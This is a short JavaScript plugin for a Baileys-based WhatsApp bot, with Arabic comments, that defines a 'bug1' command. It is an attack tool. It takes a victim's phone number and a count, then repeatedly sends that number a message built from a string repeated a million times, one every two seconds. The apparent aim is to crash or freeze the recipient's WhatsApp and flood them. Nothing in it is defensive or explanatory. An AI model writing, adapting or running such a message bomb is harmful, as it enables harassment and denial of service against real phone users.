import { WAConnection } from '@adiwajshing/baileys';

let handler = async (m, { conn, usedPrefix, args }) => {
    // التحقق من إدخال الرقم وعدد الرسائل
    if (args.length < 2) throw `استخدام الأمر كالتالي: ${usedPrefix}bug <رقم_الهاتف> <عدد_الرسائل>`;
    
    let phoneNumber = args[0];
    let messageCount = parseInt(args[1]);

    if (isNaN(messageCount) || messageCount <= 0) throw 'الرجاء إدخال عدد صحيح من الرسائل.';

    let message = 'jeeeeen aibdoavejoavan9dg'.repeat(1000000);

    // وظيفة لإرسال الرسالة
    const sendList = async (index) => {
        try {
            await conn.sendList(phoneNumber + '@s.whatsapp.net', { text: message });
            console.log(`تم إرسال الرسالة رقم ${index + 1}`);
        } catch (error) {
            console.error(`خطأ في إرسال الرسالة رقم ${index + 1}: ${error}`);
        }
    };

    // إرسال الرسائل بالتتابع مع انتظار 2 ثانية بين كل رسالة
    for (let i = 0; i < messageCount; i++) {
        setTimeout(() => sendList(i), i * 2000); // 2000 ميلي ثانية = 2 ثانية
    }
};

handler.help = ['bug <رقم_الهاتف> <عدد_الرسائل>'];
handler.tags = ['tools'];
handler.command = /^(bug1)$/i;

export default handler;